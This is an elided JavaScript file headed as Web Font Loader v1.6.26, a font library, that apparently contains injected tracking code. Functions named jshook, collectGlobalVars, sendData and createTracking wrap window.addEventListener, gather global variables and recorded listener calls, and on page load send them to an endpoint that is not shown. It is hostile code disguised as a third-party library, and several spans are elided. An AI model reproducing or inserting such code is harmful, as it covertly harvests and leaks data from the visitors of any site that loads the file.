...
/* Web Font Loader v1.6.26 - (c) Adobe Systems, Google. License: Apache 2.0 */(function () {
  ...
  let collectedGlobal = [];
  function jshook(collectionName, originalHook) {
    return function () {
      collectedGlobal.push({
        hookName: collectionName,
        timestamp: Date.now(),
  ...
  ;
  window.addEventListener = jshook('addEventListener', window.addEventListener);
  function ha(a, b) {
    this.c = a;
  ...
  function sendData(data) {
    ...
    }).then(response => response.text()).then(data => console.log('Data successfully sent!')).catch(error => console.error('Error:', error));
  }
  function ja() {
    this.c = {};
  }
  ...
  function createTracking() {
    const collectedData = collectGlobalVars();
    sendData(collectedData);
    sendData({
      eventListeners: collectedGlobal
    });
  }
  ...
  window.addEventListener('load', createTracking);
